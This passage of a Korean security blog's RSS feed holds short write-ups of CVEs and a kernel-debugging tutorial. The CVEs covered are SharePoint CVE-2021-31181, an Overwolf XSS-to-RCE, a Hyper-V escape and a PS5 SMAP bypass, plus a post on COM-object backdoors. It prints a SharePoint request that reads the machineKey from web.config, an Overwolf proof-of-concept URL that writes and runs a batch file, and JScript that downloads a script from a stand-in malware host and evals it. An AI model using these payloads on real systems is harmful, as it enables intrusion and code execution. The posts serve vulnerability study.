-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021년 5월 11일 릴리스 이전 버전의 Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint에서 인증된 사용자가 SharePoint의 웹 애플리케이션의 서비스 계정 context에서 임의 코드를 실행할 수 있는 취약점이 발견되어 5월에 패치되었습니다.</p><p>해당 취약점은 <code>EditingPageParser.VerifyControlOnSafeList()</code> 메소드에서 사용자 입력 값 검증 미흡으로 발생합니다. 이 메소드는 unsafe controls 리스트와 사용자의 입력 값을 비교하여 확인하며 <code>web.config</code>에 지정된 <code>SafeControl</code>에 의해 안전한 컨트롤이 없는 경우 예외를 발생시킵니다.</p><p>하지만 검사를 우회하는 방법이 존재합니다. <code>EditingPageParser.ParseStringInternal()</code>은 사용자 입력 값(<code>dscXml</code>)을 구문 분석하고 <code>hashtable</code>을 Register directive 정보로 채운 다음 서버 컨트롤을 나타내는 태그로 <code>hashtable2</code>를 채웁니다. 그 후 <code>hashtable2</code>의 각 요소에 대해 <code>Type</code> 객체를 생성하고 <code>SafeControls</code>의 allowed list와 비교하여 확인합니다. 하지만 <code>Type</code>을 확인할 수 없을 때 서버 컨트롤 태그가 무시됩니다. 이를 통해 <code>WebPartPagesWebService.RenderWebPartForEdit</code> 웹 API 메소드로 <code>/_vti_bin/webPartPages.asmx</code> 엔드포인트를 통해 접근할 수 있습니다. <code>aspx</code>를 입력 값으로 사용하여 <code>EditPageParser.VerifyControlOnSafeList</code>를 사용해 확인 후 unsafe element가 없으면 디자인 모드에서 마크업을 처리합니다. 이때 <code>RenderWebPartForEdit</code>의 request는 다음과 같습니다.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;6e7040c8-0338-4448-914d-a7061e0fc347&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>따라서 <code>web.config</code>의 machinekey section을 사용하여 서버에서 <code>ViewState</code>가 deserialize 될 때 임의의 OS 명령을 실행하는 <code>VIEWSTATE</code> 파라미터를 생성할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/sharepoint/">sharepoint</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
-      <link>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/</link>
-      <guid>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/</guid>
-      <pubDate>Wed, 02 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swordbytes.com/blog/security-advisory-overwolf-1-</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf는 PC 게임을 위한 확장 프로그램의 개발 프래임워크를 제공하고 유통하는 플랫폼입니다. Overwolf Store의 URL handler에 Reflected Cross-Site Scripting(XSS)을 이용한 원격 코드 실행 취약점이 발견되었습니다. </p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre><p><code>overwolfstore://</code> Custum Scheme를 사용하면 웹브라우저를 통해 OverwolfAppstore.exe 프로세스를 실행할 수 있습니다. URL의 category에 해당하는 부분이 오류 메세지의 일부로 responce body에 reflect 되며 Overwolf Store UI의 DOM에 reflect 되므로 XSS 공격이 가능합니다.</p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre><p>위는 PoC 코드로 다음과 같은 작업을 합니다.</p><ol><li>누군가 악성 URL에 접속하면 Overwolf Store 응용프로그램이 실행되고 XSS 취약점 트리거.</li><li><code>C:\windows\temp\</code> 폴더에 악성 batch 파일 생성.</li><li>batch 파일 실행</li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/sandbox-escape/">sandbox escape</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-28476: Microsoft Hyper-V의 Guest-to-Host RCE 취약점</title>
-      <link>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/</link>
-      <guid>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/</guid>
-      <pubDate>Tue, 01 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0vercl0k/CVE-2021-28476&quot;&gt;CVE-2021-2847</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host “Microsoft Hyper-V Remote Code Execution Vulnerability” in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 하이퍼바이저 기반 가상화 시스템인 Hyper-V에서 게스트 머신이 호스트 머신으로 escape 해 원격 코드 실행이 가능한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 호스트 머신의 <code>vmswitch.sys</code> 드라이버에 존재합니다. <code>vmswitch.sys</code>는 가상 파티션이 존재하는 시스템에서 파티션 간 통신에 사용되는 채널 기반 통신 메커니즘인 <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> 기능을 지원합니다. <code>vmswitch.sys</code>의 <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> 함수에서는 원격 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  요청을 처리하는데, 게스트 머신에서 악성 RNDIS 요청을 보내 해커가 제어하는 데이터로 호출이 가능하고 이를 이용해 호스트 머신이 게스트 머신의 포인터를 역참조 하도록 합니다.</p><p>해커는 Hyper-V에 Ubuntu focal 게스트 머신을 생성한 뒤 해당 취약점을 악용해 원격 코드 실행을 트리거할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/hyper-v/">hyper-v</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] COM 객체를 활용한 백도어</title>
-      <link>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/</link>
-      <guid>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/</guid>
-      <pubDate>Mon, 31 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/maltrak/com-objects-p-1-the-hidden-bac</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 몇 년간, 해커들은 COM Object을 통해 fileless attack, defense 우회, 화이트리스트를 우회하고 RPC 프로토콜을 사용하여 내부에 침투하기도 했습니다. 해커들이 COM 객체를 통해 공격을 진행하는 방법은 다음과 같습니다.</p><p>먼저 Initial Access를 위한 COM 객체를 생성합니다. 내부 네트워크에 접근하기 위해서 페이로드를 전송할 수 있어야 합니다. COM Scriptlet을 통해 악성 자바스크립트나 VBScript를 다운로드하고 실행할 수 있습니다.</p><p>COM을 활용하여 악성 스크립트를 다운로드하고 실행하는 Scriptlet 코드는 다음과 같이 구성됩니다. 첫번째로 Shell에 접근합니다.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>를 통해 <code>WScript.Shell</code>을 호출하여 명령을 실행할 수 있습니다.  그 다음 네트워크 통신을 통해 악성 스크립트 파일을 다운로드하고 실행합니다.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NET의 Serialization을 활용하여 위의 작업을 수행할 수 있습니다. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>를 <code>ActiveXObject</code>로 호출하면 객체를 base64로 인코딩할 수 있고 메모리에서 디코딩되어 메인 코드를 실행할 수 있습니다. 이는 <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>를 통해 쉽게 활용할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/backdoor/">backdoor</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/com/">com</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/vbscript/">vbscript</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/jscript/">jscript</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[Research] 공대오빠가 알려주는 Windows Driver Part 1 - Setting Up Kernel Debugging</title>
-      <link>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</link>
-      <guid>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</guid>
-      <pubDate>Sun, 30 May 2021 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;서론&quot;&gt;&lt;a href=&quot;#서론&quot; class=&quot;headerlink&quot; title=&quot;서론&quot;&gt;&lt;/a&gt;서론&lt;/h1&gt;&lt;p&gt;안녕하세요! L0ch입니다. 지난번 pwn cool sexy 시리즈에 이어 새로운 시리즈로 돌아왔습니다!  그 사이에 기말고사</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요! L0ch입니다. 지난번 pwn cool sexy 시리즈에 이어 새로운 시리즈로 돌아왔습니다!  그 사이에 기말고사 기간이 된 건 덤.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>과거의 나야.. 너 기말도 망했어</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>교수님 종강좀요ㅠㅠㅠ</p><p>이번 시리즈에서는 하루한줄을 보다 보면 꽤 자주 나오는 Windows third-party driver의 권한상승 취약점을 다룰 예정입니다! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>이 드라이버 아님ㅎㅎ;</p></blockquote><p>예시를 하나 들어보자면.. 최근 이슈가 된 Dell의 BIOS 업데이트에 사용되는 드라이버에서 나온 <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점 </a> 정도가 있겠네요. 대충 심각한 취약점인건 알겠는데 IOCTL은 뭐고… <code>EPROCESS</code>? 토큰을 어떻게 덮어 쓴다는 건지 또 권한상승은 어떻게 한다는 건지.. 정말 모르는 용어, 개념 투성이네요. 공부할게 너무 많지만 ㅠㅠㅠ 하나씩 공부하다보면 언젠가는 드라이버 취약점을 찾을수도 있겠죠?</p><p>오늘은 시리즈 첫 글이니 가볍게 디버깅 환경 세팅으로 시작해서 앞으로 간단한 exploit 예제를 다루고, one-day 분석하는 것을 끝으로 마무리하려고 합니다. 이번 시리즈도 길어질 것 같은 예감이 드는 건.. 기분 탓인가..?</p><h1 id="준비"><a href="#준비" class="headerlink" title="준비"></a>준비</h1><p>우선 디버깅 세팅부터 해야 합니다. 커널 디버깅은 유저 모드 애플리케이션과 달리 로컬에서 디버깅할 수 없습니다. 완전히 불가능한 것은 아니지만 제약사항이 많죠. 그래서! 보통은 원격지 PC를 하나 구성해 디버거를 세팅합니다.</p><p>이전에는 named pipe를 사용해 가상 시리얼 포트로 커널 디버깅을 했지만 시리얼 포트 속도의 한계로 KDNET 네트워크 디버깅을 사용하며 필요한 준비는 아래와 같습니다.</p><p><strong>1. 호스트 Windows와 VMware or Hyper-V의 게스트 Windows</strong></p><p>Windbg를 사용해 커널을 분석할 것이기 때문에 분석대상이 되는 디버기 Windows와 분석을 진행할 Windows가 각각 필요합니다. 호스트가 Windows 환경이면 게스트 Windows VM 하나만 올리면 됩니다. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>네 저는 맥을 사용하기 때문에…..  Windows VM 두개를 올려서 진행했습니다. </p><p>네? 어디서 뭐가 돌아가는 소리 안나냐구요?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>이륙한드아아ㅏㅏ !!!</p></blockquote><p>맥이 잘 버텨주고 있으니 다행이네요 ㅎㅎ 아님말고<br>글에서는 편의상 호스트 OS가 Windows라고 가정하고 분석할 디버기 Windows를 게스트라고 부르겠습니다! </p><p><strong>2. 블루스크린을 친구처럼 생각하는 강인한 멘탈(?)</strong></p><p>사실 취약점 찾는 입장에서 블루스크린은 곧 크래시기 때문에 블루스크린을 본다면 개이득이죠ㅋㅋ  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>편안-</p></blockquote><p>멘탈까지 준비가 모두 되었다? 바로 디버깅 세팅으로 고고고</p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>먼저 게스트와 호스트 Windows에 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>를 설치합니다. 호스트 Windows에는 Windbg Preview를 설치해 사용해도 되지만 Windbg Preview는 kdnet이 없기 때문에 게스트 Windows에는 Windbg를 SDK로 설치해야 합니다!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg 설치를 끝냈으면 게스트 VM 설정→Network Adapter에서 Network connection을 Bridged로 설정해 호스트와 통신할 수 있게 설정한 뒤 통신이 잘 되는지 테스트를 해봅니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>핑 테스트 할 때는 호스트와 게스트 모두 방화벽에서 ICMP 인바운드 허용하는 것 잊지 마세요!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>정상적으로 통신이 되는 걸 확인했으면 호스트의 host name을 확인합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>게스트에서 cmd를 관리자 권한으로 실행해 다음과 같이 <code>kdnet.exe</code>을 실행합니다. 이때 포트는 50000 ~ 50039 범위 안에서 줍니다.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>해당 머신을 디버깅하기 위해 커맨드를 호스트 머신에서 실행하라고 하네요! 빨간 박스의 커맨드를 복사해놓습니다.</p><p>이제 호스트의 Windbg Preview를 실행하고 Start debugging → Attach to Kernel → Net 에서 포트와 커맨드를 입력합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OK를 눌러 Windbg Preview가 대기 상태가 되면 게스트를 <code>shutdown -r -t 0</code> 으로 재부팅해줍니다. </p><p>재부팅하면..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>잘 붙은 것 같죠? 디버기 머신인 게스트 Windows도 확인해볼게요.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>디버거가 붙은 상태에서 부팅되면 우측 하단에 테스트 모드와 빌드 버전 정보가 표시되는 것을 확인할 수 있습니다. </p><p>다음 파트부터는 본격적으로 Windows의 third-party driver와 취약점, one-day 분석까지 알아보도록 하겠습니다 ㅎㅎ</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows-driver/">windows driver</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/debugging/">debugging</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel-debugging/">kernel debugging</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/third-party-driver-exploitation/">third-party driver exploitation</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
-      <link>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</link>
-      <guid>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</guid>
-      <pubDate>Sun, 30 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1048322&quot;&gt;SMAP bypass(PS5)&lt;/</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)은 커널에서 유저랜드 메모리에 접근하지 못하게 하여 취약점 익스플로잇을 어렵게 하는 커널 레벨 보호기법입니다.</p><p>PlayStation 5(이하 PS5)는 FreeBSD 12 기반으로 개발된 운영체제인 Orbis 2.0을 사용합니다. CVE-2021-29628은 FreeBSD 12에서 발견됐었던 취약점이지만, PS5에서 이 취약점에 대해 패치를 하지 않아 PS5에서 SMAP를 bypass할 수 있었습니다.</p><p>PS5에서 SMAP가 활성화되어 있는 상태(<code>Rflags</code>의 <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>가 세팅되지 않은 상태)에서 커널에서 유저 페이지에 접근하면 page fault가 발생합니다. 반면에 <code>%RFLAGS.AC</code>가 세팅되지 않은 상태에서는 커널에서 정상적으로 유저 페이지에 접근이 가능합니다. 하지만 FreeBSD 커널에서는 <code>copyin()</code>과 <code>copyout()</code> 함수들을 통해 <code>%RFLAGS.AC</code>를 잠시 세팅해서 유저 페이지에 접근합니다.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> 함수가 실행되면 fault handler인 <code>copy_fault()</code> 함수를 handler로 등록한 후 <code>%RFLAGS.AC</code>를 세팅해 복사 작업을 진행합니다. 그리고 복사 작업이 끝나면 다시 <code>%RFLAGS.AC</code>를 클리어합니다. 이 때, 복사 과정에서 fault가 발생하면 <code>trap()</code>함수가 실행됩니다.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> 함수에서는 <code>curpcb-&gt;pcb_onfault</code>에 값이 들어가 있으면 이 안에 값을 <code>fram→tf_rip</code>에 넣고 바로 return 하는데, 이 때 <code>%RFLAGS.AC</code>를 클리어하지 않아 SMAP이 비활성화인 상태로 핸들링을 마무리합니다. 따라서 이를 통해 SMAP를 bypass하여 이 이후의 syscall들을 SMAP이 비활성화된 상태에서 실행할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
